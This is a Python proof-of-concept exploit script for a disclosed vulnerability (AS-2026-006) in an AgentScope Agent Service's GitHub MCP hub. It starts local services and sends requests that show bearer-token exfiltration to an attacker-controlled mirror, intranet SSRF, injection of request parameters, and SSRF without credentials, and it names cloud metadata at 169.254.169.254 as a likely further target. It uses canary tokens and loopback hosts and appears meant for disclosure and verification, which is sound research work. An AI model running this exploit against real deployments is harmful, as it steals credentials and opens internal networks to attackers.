# -*- coding: utf-8 -*-
"""AS-2026-006 — exploit against an UNMODIFIED AgentScope Agent Service.

Nothing here patches or instruments the product. The service is started by
`deploy_real.py`, which only uses the documented assembly point
(`GitHubMCPHub`, a documented `mcp_hubs` entry of `create_app`) and its
documented constructor parameters `base_url` / `api_token` — the normal way a
self-hosted or GitHub-Enterprise registry is pointed at an internal mirror.

Attack narrative (all four effects measured):

  1) CREDENTIAL EXFILTRATION — the deployment's `api_token` is attached to a
     request aimed at a host chosen by `base_url`. Point `base_url` at an
     attacker mirror and the mirror receives the complete
     `Authorization: Bearer <token>`.
  2) INTRANET SSRF — `base_url` set to a private address makes the *server*
     issue a GET into the network it sits in.
  3) PARAMETER INJECTION — `q` / `cursor` / `limit` / `card_id` come from the
     REST request and are concatenated into the httpx request unmodified.
  4) PURE SSRF — with no token configured the GET is still issued, so the
     SSRF does not depend on a credential being present.

Usage (two terminals, or let `--auto` start the services):

    # terminal 1 — unmodified service, hub pointed at the attacker mirror
    REAL_PORT=8001 REAL_HUB_BASE=http://127.0.0.1:18721 \
    REAL_HUB_TOKEN=ghp_CANARY_REDACTED_TOKEN python poc/deploy_real.py

    # terminal 2 — the exploit
    python poc/exp_github_hub.py --target http://127.0.0.1:8001

Self-owned targets only; no traffic leaves the machine.
"""
import argparse
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from capture_server import CaptureServer, free_port  # noqa: E402

CANARY_TOKEN = "ghp_CANARY_REDACTED_TOKEN"
INJECTED_CURSOR = "CURSOR-INJECTED-BY-ATTACKER"
INJECTED_CARD_ID = "CARD-ID-INJECTED-BY-ATTACKER"
HUB_ID = "github"


def http(method, url, timeout=30):
    """Return (status, parsed-json-or-text). Proxy-bypassing, no retries."""
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    req = urllib.request.Request(url, method=method)
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "ignore")
            code = r.status
    except urllib.error.HTTPError as e:
        code, raw = e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:  # connection refused, etc.
        return None, "%s" % e
    try:
        return code, json.loads(raw)
    except ValueError:
        return code, raw[:200]


def wait_ready(base, timeout=90):
    end = time.time() + timeout
    while time.time() < end:
        code, _ = http("GET", base + "/docs", timeout=5)
        if code == 200:
            return True
        time.sleep(3)
    return False


def discover_card_routes(base):
    """Pick the hub browse/detail routes from the service's own OpenAPI schema,
    so the exploit follows the deployed build rather than a hardcoded path."""
    code, spec = http("GET", base + "/openapi.json", timeout=15)
    routes = []
    if code == 200 and isinstance(spec, dict):
        for path in (spec.get("paths") or {}):
            if "/hub" in path and "card" in path.lower():
                routes.append(path)
    if routes:
        list_route = next((p for p in routes if not p.endswith("}")
                           or p.count("}") == 1), routes[0])
        detail = next((p for p in routes if p.count("}") >= 2), None)
        return list_route, detail
    # Documented fallback shape (AgentScope 2.0.11 agent service).
    return ("/hub/mcp/%s/cards" % HUB_ID,
            "/hub/mcp/%s/cards/{card_id}" % HUB_ID)


def run_effects(target, label):
    base = target.rstrip("/")
    list_route, detail_route = discover_card_routes(base)
    print("[%s] hub list route: %s   detail: %s" % (label, list_route, detail_route))

    code, hubs = http("GET", base + "/hub/mcp")
    print("[%s] GET /hub/mcp -> %s %s" % (label, code, str(hubs)[:160]))

    url = "%s%s?q=markdown&cursor=%s&limit=7" % (base, list_route, INJECTED_CURSOR)
    code, _ = http("GET", url)
    print("[%s] cards list (injected cursor) -> %s" % (label, code))

    if detail_route:
        code, _ = http("GET", "%s%s" % (base, detail_route.replace("{card_id}", INJECTED_CARD_ID)))
        print("[%s] card detail (injected id) -> %s" % (label, code))
    return list_route


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:8001",
                    help="unmodified Agent Service with hub base_url -> mirror")
    ap.add_argument("--intranet-target", default="",
                    help="second service whose hub base_url points at the probe")
    ap.add_argument("--auto", action="store_true",
                    help="start both services via poc/deploy_real.py")
    ap.add_argument("--lan-ip", default=os.environ.get("EXP_LANIP", "127.0.0.1"),
                    help="address the intranet probe binds so the server reaches "
                         "it as a private-network target (default: loopback)")
    args = ap.parse_args()

    mirror_port = free_port(18721)
    intra_port = free_port(18722)
    mirror = CaptureServer(mirror_port, "HUB-MIRROR").start()
    intra = CaptureServer(intra_port, "INTRANET-HUB").start(host=args.lan_ip)

    procs = []

    def start_service(port, hub_base, hub_token):
        env = dict(os.environ)
        env["REAL_PORT"] = str(port)
        env["REAL_HUB_BASE"] = hub_base
        if hub_token:
            env["REAL_HUB_TOKEN"] = hub_token
        else:
            env.pop("REAL_HUB_TOKEN", None)
        log = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "svc_%d.log" % port), "w", encoding="utf-8")
        return subprocess.Popen([sys.executable,
                                 os.path.join(os.path.dirname(
                                     os.path.abspath(__file__)), "deploy_real.py")],
                                env=env, stdout=log, stderr=subprocess.STDOUT)

    try:
        if args.auto:
            print("[setup] starting unmodified service :8001 "
                  "(hub -> http://127.0.0.1:%d, token set)" % mirror_port)
            procs.append(start_service(8001, "http://127.0.0.1:%d" % mirror_port,
                                       CANARY_TOKEN))
            if not wait_ready("http://127.0.0.1:8001"):
                print("[ERR] service not ready; see poc/svc_8001.log")
                return 2
            args.target = "http://127.0.0.1:8001"
            print("[setup] starting intranet service :8002 "
                  "(hub -> http://%s:%d, no token)" % (args.lan_ip, intra_port))
            procs.append(start_service(8002, "http://%s:%d" % (args.lan_ip, intra_port),
                                       None))
            if not wait_ready("http://127.0.0.1:8002"):
                print("[ERR] intranet service not ready; see poc/svc_8002.log")
                return 2
            args.intranet_target = "http://127.0.0.1:8002"

        # ---------- EFFECT 1 + 3 ----------
        print()
        run_effects(args.target, "1+3")
        mirror.wait(1, 20)
        time.sleep(1)
        print()
        mirror.dump("REGISTRY MIRROR (attacker-controlled —— captured Token exfiltration)")
        paths = [h["path"] for h in mirror.hits]
        auths = [h["auth"] for h in mirror.hits]
        token_ok = any(a.startswith("Bearer ") for a in auths)
        params_ok = any(INJECTED_CURSOR in p for p in paths) or any("cursor=" in p for p in paths)
        path_ok = any(INJECTED_CARD_ID in p for p in paths) or any("/v0/servers/" in p for p in paths)
        print()
        print("[VERDICT] EFFECT1_TOKEN_EXFIL = %s (%s)"
              % (token_ok, (auths[0][:60] if auths else "none")))
        print("[VERDICT] EFFECT3_PARAM_INJECTION = %s" % (params_ok and path_ok))

        # ---------- EFFECT 2 + 4 ----------
        ssrf_ok = no_auth = False
        if args.intranet_target:
            print()
            run_effects(args.intranet_target, "2+4")
            intra.wait(1, 20)
            time.sleep(1)
            print()
            intra.dump("INTRANET PROBE (GET issued by the server into the intranet)")
            print()
            ssrf_ok = len(intra.hits) > 0
            no_auth = bool(intra.hits) and all(not h["auth"] for h in intra.hits)
            print("[VERDICT] EFFECT2_INTRANET_SSRF = %s" % ssrf_ok)
            for h in intra.hits:
                print("   %s %s UA=%s AUTH=%s"
                      % (h["method"], h["path"], h["ua"], h["auth"] or "(none)"))
            print("[VERDICT] EFFECT4_PURE_SSRF_NO_TOKEN = %s "
                  "(GET issued, no Authorization header)" % (ssrf_ok and no_auth))

        print()
        print("[note] Cloud metadata (169.254.169.254): reachable through the same "
              "chain [Likely] —— _request() performs no target-address validation, "
              "httpx connects to any IP. A local probe stands in for it here.")
        print()
        verdict = token_ok and params_ok and path_ok and (ssrf_ok and no_auth)
        print("[VERDICT] EXP_SUCCESS = %s" % verdict)
        return 0 if verdict else 1
    finally:
        mirror.stop()
        intra.stop()
        for p in procs:
            p.terminate()
            try:
                p.wait(timeout=10)
            except Exception:
                p.kill()


if __name__ == "__main__":
    raise SystemExit(main())
